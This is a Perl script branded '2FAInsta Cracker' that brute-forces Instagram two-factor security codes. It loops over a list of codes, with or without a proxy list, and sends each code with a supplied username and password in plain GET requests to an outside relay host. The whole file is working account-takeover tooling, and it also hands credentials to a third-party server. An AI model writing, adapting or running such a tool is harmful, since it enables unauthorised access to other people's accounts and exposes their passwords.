use LWP::UserAgent;
system('cls');
system('color 1e');
print '
###################
# Coded By 1337r00t
###################
...........................................................................
.%%%%....%%%%%%..%%%%%%..%%%%%%.......%%%%%%\...../%%%\..../%%%\....%%%%%%.
...%%........%%......%%.....(%/.......%%....%)...%:...:%..%:...:%.....%%...
...%%....%%%%%%..%%%%%%....(%/........%%%%)%.}...%:...:%..%:...:%.....%%...
...%%........%%......%%...(%/.........%%...\%)...%:...:%..%:...:%.....%%...
.%%%%%%..%%%%%%..%%%%%%..(%...........%%....\%)...\%%%/....\%%%/......%%...
...........................................................................
\n';
print qq(
#============================#
#     2FAInsta Cracker       #
#     C0ded by 1337r00t      #
#    Instagram: 1337r00t     #
#============================#\n
\n1 - With Proxy\n2 - Without Proxy\n\n> );
$do = <STDIN>;
chomp($do);
system('cls');
#######################################################################################
if ($do == 1){
	print qq(
	Enter Proxys File:
	> );
	$proxylist=<STDIN>;
	chomp($proxylist);
	open (PROXYFILE, "<$proxylist") || die "[-] Can't Found The List Of Proxys !";
	@PROXYS = <PROXYFILE>;
	close PROXYFILE;
	
	print qq(
	Enter Username :
	> );
	$user=<STDIN>;
	chomp($user);
	
	print qq(
	Enter Password :
	> );
	$pass=<STDIN>;
	chomp($pass);
	
	print qq(
	Enter Security Codes File:
	> );
	$codelist=<STDIN>;
	chomp($codelist);
	open (CODEFILE, "<$codelist") || die "[-] Can't Found The List Of Codes !";
	@CODES = <CODEFILE>;
	close CODEFILE;
	######################
	foreach $code (@CODES) {
	chomp $code;
		foreach $proxy (@PROXYS) {
		chomp $proxy;
			$ua = LWP::UserAgent->new();
			$request = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/instagram/proxy.php?proxy=$proxy&user=$user&pass=$pass&code=$code");
			$response = $ua->request($request);
			$output = $response->content();
			print "$output\n";
		}
	}
}
##################################################################################
if ($do == 2){

print qq(
Enter Username :
> );
$user2=<STDIN>;
chomp($user2);

print qq(
Enter Password :
> );
$pass2=<STDIN>;
chomp($pass2);

print qq(
Enter Security Codes File:
> );
$codelist2=<STDIN>;
chomp($codelist2);
open (CODEFILE2, "<$codelist2") || die "[-] Can't Found The List Of Codes !";
@CODES2 = <CODEFILE2>;
close CODEFILE2;
######################
foreach $code2 (@CODES2) {
chomp $code2;
	$ua2 = LWP::UserAgent->new();
	$request2 = HTTP::Request->new(GET => "http://www.mughniagent.co.uk/instagram/normal.php?user=$user2&pass=$pass2&code=$code2");
	$response2 = $ua2->request($request2);
	$output2 = $response2->content();
	print "$output2\n";
}
}
